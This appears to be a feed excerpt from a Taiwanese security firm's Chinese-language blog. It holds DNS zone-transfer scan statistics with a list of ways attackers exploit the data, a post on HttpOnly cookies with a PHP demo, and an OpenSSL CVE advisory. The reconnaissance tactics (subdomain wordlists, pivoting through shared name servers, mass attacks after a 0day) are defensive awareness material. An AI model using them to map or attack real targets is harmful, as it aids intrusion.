&lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-VNyNVj3MkAA/U2mqBMfEKfI/AAAAAAAAAVU/FGGPow_qt_E/w367-h693-no/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-VNyNVj3MkAA/U2mqBMfEKfI/AAAAAAAAAVU/FGGPow_qt_E/w367-h693-no/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer 問題的 name server 相關統計&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可執行 zone transfer 且不重複的 namer server 共有 53830 個&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ip-&quot;&gt;關於 IP 位址的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;有 7939172 個不重複的 IP 位址&lt;/li&gt;
  &lt;li&gt;在全部 IP 位址中，有 704638 個是私有 IP 位址&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 598443 個是 10. 開頭，佔所有 IP 位址的 7.538%，佔私有 IP 位址的 84.929%&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 66270 個是 172.16~31 開頭，佔所有 IP 位址的 0.835%，佔私有 IP 位址的 9.405%&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 39925 個是 192.168 開頭，佔所有 IP 位址的 0.503%，佔私有 IP 位址的 5.666%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;subdomain-&quot;&gt;subdomain 的統計數據&lt;/h3&gt;

&lt;p&gt;以下選出一些常被入侵者當作攻擊目標的 subdomain 來計算在 22631804 筆 DNS 記錄中分別各佔了幾筆，每個 subdomain 共有兩個統計結果，逗號左邊的統計結果代表以該 subdomain 開頭的 DNS 記錄，例如 git.devco.re。逗號右邊的統計結果則將前後有數字的 subdomain 也一併計入，例如 dns01.devco.re、01dns.devco.re、0dns001.devco.re 等等。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;版本控制&lt;/p&gt;

    &lt;p&gt;git: 583, 626&lt;/p&gt;

    &lt;p&gt;gitlab: 138, 138&lt;/p&gt;

    &lt;p&gt;svn: 1552, 1669&lt;/p&gt;

    &lt;p&gt;subversion: 71, 72&lt;/p&gt;

    &lt;p&gt;cvs: 284, 330&lt;/p&gt;

    &lt;p&gt;hg: 115, 331&lt;/p&gt;

    &lt;p&gt;mercurial: 18, 19&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;開發與測試&lt;/p&gt;

    &lt;p&gt;test: 14691, 20001&lt;/p&gt;

    &lt;p&gt;dev: 8300, 10959&lt;/p&gt;

    &lt;p&gt;stage: 1329, 1628&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;資料庫&lt;/p&gt;

    &lt;p&gt;db: 1190, 2537&lt;/p&gt;

    &lt;p&gt;database: 150, 302&lt;/p&gt;

    &lt;p&gt;sql: 2209, 3298&lt;/p&gt;

    &lt;p&gt;mysql: 4045, 4998&lt;/p&gt;

    &lt;p&gt;postgre: 11, 11&lt;/p&gt;

    &lt;p&gt;redis: 21, 33&lt;/p&gt;

    &lt;p&gt;mongodb: 6, 42&lt;/p&gt;

    &lt;p&gt;memcache: 13, 72&lt;/p&gt;

    &lt;p&gt;phpmyadmin: 455, 485&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;後台管理&lt;/p&gt;

    &lt;p&gt;manager: 188, 222&lt;/p&gt;

    &lt;p&gt;staff: 481, 542&lt;/p&gt;

    &lt;p&gt;member: 331, 376&lt;/p&gt;

    &lt;p&gt;backend: 153, 177&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;線上服務相關&lt;/p&gt;

    &lt;p&gt;api: 1871, 2097&lt;/p&gt;

    &lt;p&gt;search: 1469, 10987&lt;/p&gt;

    &lt;p&gt;pic: 178, 293&lt;/p&gt;

    &lt;p&gt;img: 1775, 3517&lt;/p&gt;

    &lt;p&gt;service: 779, 959&lt;/p&gt;

    &lt;p&gt;payment: 225, 238&lt;/p&gt;

    &lt;p&gt;cache: 373, 627&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;私有服務&lt;/p&gt;

    &lt;p&gt;erp: 275, 318&lt;/p&gt;

    &lt;p&gt;eip: 69, 80&lt;/p&gt;

    &lt;p&gt;log: 227, 414&lt;/p&gt;

    &lt;p&gt;nagios: 636, 736&lt;/p&gt;

    &lt;p&gt;mrtg: 458, 565&lt;/p&gt;

    &lt;p&gt;cgi: 194, 261&lt;/p&gt;

    &lt;p&gt;dns: 2634, 9085&lt;/p&gt;

    &lt;p&gt;ns: 12198, 63431&lt;/p&gt;

    &lt;p&gt;ftp: 197414, 199481&lt;/p&gt;

    &lt;p&gt;blog: 5074, 5446&lt;/p&gt;

    &lt;p&gt;mail: 238742, 254515&lt;/p&gt;

    &lt;p&gt;email: 2484, 2706&lt;/p&gt;

    &lt;p&gt;webmail: 24164, 25067&lt;/p&gt;

    &lt;p&gt;owa: 798, 888&lt;/p&gt;

    &lt;p&gt;autodiscover: 30462, 30466&lt;/p&gt;

    &lt;p&gt;vpn: 3152, 7025&lt;/p&gt;

    &lt;p&gt;sso: 398, 462&lt;/p&gt;

    &lt;p&gt;ssl: 709, 932&lt;/p&gt;

    &lt;p&gt;proxy: 1464, 2215&lt;/p&gt;

    &lt;p&gt;cms: 1320, 1696&lt;/p&gt;

    &lt;p&gt;crm: 1152, 1301&lt;/p&gt;

    &lt;p&gt;forum: 3654, 4037&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;end-&quot;&gt;按 End 的人有福了&lt;/h3&gt;

&lt;p&gt;究竟經由 zone transfer 所得到的資料可以拿來做什麼？對於攻擊者而言，主要有以下三種利用方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;建立字典檔：入侵者可利用上述資料建立一份最常見的 subdomain 的字典檔，未來利用此字典檔進行掃描時可節省許多時間成本，快速檢測某間公司有哪些 subdomain&lt;/li&gt;
  &lt;li&gt;旁敲側擊：入侵者可觀察哪些 name server 有開放 zone transfer 查詢，接著去蒐集還有哪些公司使用同一台 name server，再進一步掃瞄那些 domain。那些 domain 也許不是大公司、不在 Alexa top 1M 內，但你無法確保它永遠不會是入侵者的攻擊目標。&lt;/li&gt;
  &lt;li&gt;結合 0day 進行攻擊：當某個第三方套件被揭露 0day 弱點時，擁有上述資料的人就可以迅速執行大範圍的攻擊。例如&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2013-0156/&quot;&gt;這幾年正夯的 Rails 在去年被爆出有 Remote Code Exection 弱點 CVE-2013-0156&lt;/a&gt;，入侵者可直接對所有 redmine 進行攻擊。&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-3412/&quot;&gt;Juniper VPN 在今年也被揭露 Remote Code Execution 弱點&lt;/a&gt;，入侵者可找尋所有 vpn subdomain 來進行嘗試。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在上次我們提起這個古老的弱點後，已經有部分台灣企業陸續將此問題修復，但許多台灣企業仍有此問題而不自知，也許過陣子我們直接做個 Wall of Shame 條列出哪些廠商有問題會讓大家比較有感 :p&lt;/p&gt;

&lt;p&gt;不過也別急著笑台灣企業，許多國際級的大網站同樣也有此類問題。由此可見資安問題不分新舊、不分國內外，總是容易被大家忽略，等到不知不覺被入侵者捅了重重的一刀後，才驚覺這許多的小弱點一旦串起來是多麼的可怕。你，開始有所警覺了嗎？&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>HttpOnly - HTTP Headers 的資安議題 (3)</title>
   <link href="http://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/"/>
   <updated>2014-06-11T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</id>
   <content type="html">
&lt;p&gt;上次我們提到了 &lt;a href=&quot;http://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;

&lt;h3 id=&quot;httponly-&quot;&gt;HttpOnly 簡介&lt;/h3&gt;

&lt;p&gt;Cookie 的概念雖然早在 1994 年就由 Netscape 的工程師 Montulli 提出，但當時仍未有完善的防護機制，像是 HttpOnly、Secure 等規範都是後來陸續被提出，直到 2011 年 4 月才在 &lt;a href=&quot;http://tools.ietf.org/html/rfc6265&quot;&gt;RFC 6265&lt;/a&gt; 中正式定案。而其中的 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;HttpOnly&lt;/a&gt; 是專門為了抵禦攻擊者利用 Cross-Site Scripting (XSS) 手法來盜取用戶身份，此項 Cookie 防護設定應該是在 HTTP Headers 系列文中最廣為人知的項目。&lt;/p&gt;

&lt;h3 id=&quot;httponly--1&quot;&gt;HttpOnly 主要作用&lt;/h3&gt;

&lt;p&gt;說明 HttpOnly 主要作用之前，先談談 XSS 最常見的利用方式。XSS 攻擊早在 1990 年就被發現，此攻擊手法最常見的利用方式是存取使用者的 cookie 來獲得一些機敏資料。像是存取 session cookie 即可盜用使用者的身份（關於 session 的重要性，可以參考我們部落格的另一篇文章 &lt;a href=&quot;http://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session 攻擊與防護&lt;/a&gt;），如果在 cookie 中記錄了其他機敏資訊，也可能會一併遭竊。因此若能阻止攻擊者存取帶有敏感資料的 cookie，就能減少 XSS 對使用者的影響，因而催生了 HttpOnly 機制。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;當 cookie 有設定 HttpOnly flag 時，瀏覽器會限制 cookie 只能經由 HTTP(S) 協定來存取。因此當網站有 XSS 弱點時，若 cookie 含有 HttpOnly flag，則攻擊者無法直接經由 JavaScript 存取使用者的 session cookie，可降低使用者身份被盜用的機率。早期有些瀏覽器未完整實作 HttpOnly 所有功能，因此攻擊者仍可透過 XMLHttpRequest 讀取 cookie，但最近幾年各大瀏覽器也陸續阻擋了這個方式。因此 HttpOnly 可有效降低 XSS 的影響並提升攻擊難度。目前瀏覽器的支援列表如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ryadJ4jta9o/UyGPRxYv-CI/AAAAAAAAAOA/ch-pNUJQcAs/w531-h122-no/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ryadJ4jta9o/UyGPRxYv-CI/AAAAAAAAAOA/ch-pNUJQcAs/w531-h122-no/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly 瀏覽器支援列表&quot; title=&quot;HttpOnly 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;其他瀏覽器支援列表以及各家程式語言使用 HttpOnly 的方式可參考 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;httponly-demo&quot;&gt;HttpOnly Demo&lt;/h3&gt;

&lt;p&gt;以下使用 PHP 程式碼為例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;title&amp;gt;HttpOnly Demo&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;h3&amp;gt;HttpOnly Demo&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;p&amp;gt;If you didn&amp;#39;t set HttpOnly flag, cookie will write down by document.write().&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            document.write(document.cookie);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-nH-7Pn8flY8/U5bZqr_TQQI/AAAAAAAAAcA/NX1xS-C0-Bc/w1138-h687-no/httponly-unset.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-nH-7Pn8flY8/U5bZqr_TQQI/AAAAAAAAAcA/NX1xS-C0-Bc/w1138-h687-no/httponly-unset.png&quot; alt=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; title=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在上圖中可看到 PHPSESSID 已成功被 JavaScript 存取，這也意味著網站有 XSS 弱點時，使用者的身份有較高的機率被盜用。為了使用 HttpOnly 進行防護，讓我們將 PHP 程式碼修改如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;session.cookie_httponly&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-xIuTi9W726o/U5bZqbseCGI/AAAAAAAAAb8/byQawQzceR4/w1138-h687-no/httponly-set.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-xIuTi9W726o/U5bZqbseCGI/AAAAAAAAAb8/byQawQzceR4/w1138-h687-no/httponly-set.png&quot; alt=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; title=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我們可以使用畫面中右上角的 Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie 套件&lt;/a&gt; 看到 HttpOnly 已經被勾選（如紅框處），並且 PHPSESSID 已無法被 JavaScript 存取，不存在於 HTML 中。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前 PHP 官方的教學是用 session_set_cookie_params 這個 function，可參考&lt;a href=&quot;http://www.php.net/manual/en/function.session-set-cookie-params.php&quot;&gt;官方網頁的這篇說明&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;httponly--2&quot;&gt;HttpOnly 實際使用案例&lt;/h3&gt;

&lt;p&gt;由於 HttpOnly 的使用方式較簡單，因此僅列舉幾個站台的使用結果圖片給大家參考，就不另外多做說明囉！&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;T客邦 (www.techbang.com)，有設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-s1rI18BhecY/U5bZpKzCjNI/AAAAAAAAAbw/EuIjX4R9AW8/w1138-h882-no/httponly-example-1.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-s1rI18BhecY/U5bZpKzCjNI/AAAAAAAAAbw/EuIjX4R9AW8/w1138-h882-no/httponly-example-1.png&quot; alt=&quot;T客邦&quot; title=&quot;T客邦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;愛料理 (icook.tw)，有設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-S3uBr-D6xQ8/U5bZpT5WM0I/AAAAAAAAAbs/IQnqvUy7jJw/w1138-h882-no/httponly-example-2.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-S3uBr-D6xQ8/U5bZpT5WM0I/AAAAAAAAAbs/IQnqvUy7jJw/w1138-h882-no/httponly-example-2.png&quot; alt=&quot;愛料理&quot; title=&quot;愛料理&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mobile01 (www.mobile01.com)，未設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-1mN1msqkvwg/U5bZpWDOj9I/AAAAAAAAAbo/6g4rHi0q_uk/w1138-h882-no/httponly-example-3.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-1mN1msqkvwg/U5bZpWDOj9I/AAAAAAAAAbo/6g4rHi0q_uk/w1138-h882-no/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Giga Circle (tw.gigacircle.com)，未設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-xX9qAnudjV8/U5bZqCN2FLI/AAAAAAAAAb4/srsZFwPfeRc/w1138-h882-no/httponly-example-4.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-xX9qAnudjV8/U5bZqCN2FLI/AAAAAAAAAb4/srsZFwPfeRc/w1138-h882-no/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;HttpOnly 是存在已久的技術，但在我們&lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;系列文第一篇&lt;/a&gt;的統計當中，採用的比例仍然偏低。如同之前我們提及的 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; 問題，即使一項資安技術或資安議題存在很久，也需要大家持續關注。&lt;/p&gt;

&lt;p&gt;但即使採用了 HttpOnly，也僅能防止惡意人士不正當存取 cookie，無法防禦其他的 XSS 攻擊方式，例如將使用者導向至釣魚網站騙取個資、導向至惡意網站植入後門、置換網頁外觀等等。同時未來仍有可能出現新的 XSS 攻擊手法，因此千萬別因設定了 HttpOnly 就掉以輕心，誤以為不會再被 XSS 手法侵害企業利益或用戶資料，仍然必須謹慎檢查每一個系統輸出輸入點，以避免未來因上述影響導致用戶或企業蒙受損失。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>OpenSSL 再爆嚴重漏洞，部分重要網站仍在風險中！</title>
   <link href="http://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/"/>
   <updated>2014-06-09T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</id>
   <content type="html">
&lt;p&gt;(本篇最後更新時間：2014.6.9 15:40 pm)&lt;/p&gt;

&lt;p&gt;OpenSSL 團隊於 6/5 修補了&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;六項安全漏洞&lt;/a&gt;，&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; 在&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;這篇文章&lt;/a&gt;中整理了這幾個漏洞的摘要，這裡截圖表格如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-btOMwf3omik/U5Vnx2xR_lI/AAAAAAAAAa4/0xB5tuTj_eQ/w794-h429-no/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-btOMwf3omik/U5Vnx2xR_lI/AAAAAAAAAa4/0xB5tuTj_eQ/w794-h429-no/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 安全更新比較表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;其中 CVE-2014-0224、CVE-2014-0195 兩項被列為 Critical，我們分別來看看這兩個弱點到底造成了什麼危害。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve-2014-0224-ccs-injection-vulnerability&quot;&gt;CVE-2014-0224 (CCS Injection Vulnerability)&lt;/h3&gt;

&lt;h4 id=&quot;section&quot;&gt;說明&lt;/h4&gt;

&lt;p&gt;加密通訊被視為預防&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&quot;&gt;中間人攻擊&lt;/a&gt;的解法之一，利用 SSL 協定防止竊聽、竄改傳輸資料是一種常見的方式。然而 OpenSSL 這次出現在 ChangeCipherSpec（更改密鑰規格）的設計瑕疵，讓攻擊者有辦法解密所有通訊內容，讓加密保護徹底失效。&lt;/p&gt;

&lt;p&gt;該弱點原理是 OpenSSL 伺服器端在實作 handshake 時並未檢查訊息的順序（嚴格來說是 ChangeCipherSpec 的順序），所以攻擊者可以提前送出 ChangeCipherSpec 訊息，使伺服器在還未初始完畢的狀態先去做 ChangeCipherSpec 的動作，最終造成加解密可解的狀況，是以此弱點稱之為 CCS Injection。更多的細節請參考原通報者 Masashi Kikuchi 的&lt;a href=&quot;http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html&quot;&gt;部落格&lt;/a&gt;，佐以&lt;a href=&quot;https://www.imperialviolet.org/2014/06/05/earlyccs.html&quot;&gt;這篇&lt;/a&gt;附程式碼的解說，OpenSSL github 上關於 CVE-2014-0224 的 &lt;a href=&quot;https://github.com/openssl/openssl/commit/a91be10833e61bcdc9002de28489405101c52650&quot;&gt;fix&lt;/a&gt; 也可以幫助了解。&lt;/p&gt;

&lt;h4 id=&quot;section-1&quot;&gt;誰應該注意&lt;/h4&gt;

&lt;p&gt;所有靠 OpenSSL 保護連線的應用服務都需要注意。又尤其是銀行、金流服務這些連線中存在金融資訊的服務，若不注意會造成信用卡卡號洩漏，網路銀行被盜用。經過實際檢測，&lt;strong&gt;目前仍有銀行單位和金流單位使用有問題的 OpenSSL 版本&lt;/strong&gt;。消費者需要特別注意，在使用前也可透過下面小工具來輔助檢查自己所使用的服務使否存在風險：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tripwire 提供的&lt;a href=&quot;http://www.tripwire.com/state-of-security/incident-detection/detection-script-for-cve-2014-0224-openssl-cipher-change-spec-injection/&quot;&gt;小程式&lt;/a&gt; (python)&lt;/li&gt;
  &lt;li&gt;測試網站 &lt;a href=&quot;http://ccsbug.exposed/&quot;&gt;http://ccsbug.exposed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;慶幸的是，此弱點只發生在用戶端及伺服器端皆使用有問題 OpenSSL 版本的狀況下。一般來說，桌面端的瀏覽器都不是使用 OpenSSL，所以一般使用者可以稍微安心。問題比較大的是 android 使用者，android 內建 OpenSSL，許多 app 呼叫它來進行加密傳輸，所以建議 android 用戶在 google 釋出更新前，不要使用手機連線到有問題的服務，或使用自帶 SSL 的 app，例如：firefox、最新版 Chrome (35.0.1916.141)…。&lt;/p&gt;

&lt;p&gt;另外，若使用者常用到一些加密連線服務，例如 VPN，請自行注意所使用軟體是否使用 OpenSSL，以免受到 CCS Injection 的影響。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-c83v3B0k_4A/U5VnmAsGBVI/AAAAAAAAAaw/VtVNovmHLnQ/s240-no/logo.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-c83v3B0k_4A/U5VnmAsGBVI/AAAAAAAAAaw/VtVNovmHLnQ/s240-no/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;最後說個題外話，原來現在發表漏洞還要為漏洞出張圖，在 Hacker News 原討論串的&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;這篇回應&lt;/a&gt;，就有人說：『這個漏洞有 logo 嗎？如果沒有我就不打算認真看待它！』XD&lt;/p&gt;

&lt;h3 id=&quot;cve-2014-0195-dtls-arbitrary-code-execution&quot;&gt;CVE-2014-0195 (DTLS arbitrary code execution)&lt;/h3&gt;

&lt;h4 id=&quot;section-2&quot;&gt;說明&lt;/h4&gt;

&lt;p&gt;OpenSSL 在處理 &lt;a href=&quot;http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security&quot;&gt;DTLS&lt;/a&gt; 訊息上，為了避免 IP fragmentation，所以做了一些處理機制，這個處理機制並沒有好好驗證 DLTS ClientHello 中的 fragment 長度（嚴格來說是在正確的位置做驗證），若攻擊者發送一個很長的 fragment，能造成緩衝區溢位攻擊。更多的細節請參考&lt;a href=&quot;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5FqnvmSyD4&quot;&gt;這篇文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;比較有趣的是那段出問題的程式碼是一位有名德國工程師 Robin Seggelmann 寫的，有名的點在於上次非常嚴重的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 事件也是他寫的 code XD&lt;/p&gt;

&lt;h4 id=&quot;section-3&quot;&gt;誰應該注意&lt;/h4&gt;

&lt;p&gt;使用 OpenSSL 且有用到 DTLS 的服務提供者，通常是 VoIP、WebRTC、VPN 這類服務，這個風險有可能會造成伺服器被入侵。&lt;/p&gt;

&lt;h3 id=&quot;section-4&quot;&gt;修補&lt;/h3&gt;

&lt;p&gt;除了上面所提及兩個嚴重風險，這次的更新也同時修復了幾個 DOS 的弱點，強烈建議伺服器端更新。
請確認 OpenSSL 已經更新到下面版本，並且有重新啟動讓其生效。
- OpenSSL 0.9.8za
- OpenSSL 1.0.0m
- OpenSSL 1.0.1h&lt;/p&gt;

&lt;p&gt;更新資訊依據所用的系統分別如下：
- &lt;a href=&quot;http://www.ubuntu.com/usn/usn-2232-1/&quot;&gt;Ubuntu&lt;/a&gt;
- &lt;a href=&quot;https://lists.debian.org/debian-security-announce/2014/msg00129.html&quot;&gt;Debian&lt;/a&gt;
- &lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-14:14.openssl.asc&quot;&gt;FreeBSD&lt;/a&gt;
- &lt;a href=&quot;http://lists.centos.org/pipermail/centos-announce/2014-June/020344.html&quot;&gt;CentOS&lt;/a&gt;
- &lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0624.html&quot;&gt;Red Hat 5&lt;/a&gt;
- &lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0625.html&quot;&gt;Red Hat 6&lt;/a&gt;
- &lt;a href=&quot;https://aws.amazon.com/jp/security/security-bulletins/openssl-security-advisory/&quot;&gt;Amazon Linux AMI&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-5&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;這次 OpenSSL 做了數個安全性的更新，雖然不若&lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;之前 Heartbleed 那麼嚴重&lt;/a&gt;，但卻也讓使用者暴露在風險中。建議有使用 OpenSSL 都應該更新到最新版本，尤其是一些大型的銀行及金流服務，更應儘速更新。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>HTTP Session 攻擊與防護</title>
   <link href="http://devco.re/blog/2014/06/03/http-session-protection/"/>
   <updated>2014-06-03T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/06/03/http-session-protection</id>
   <content type="html">
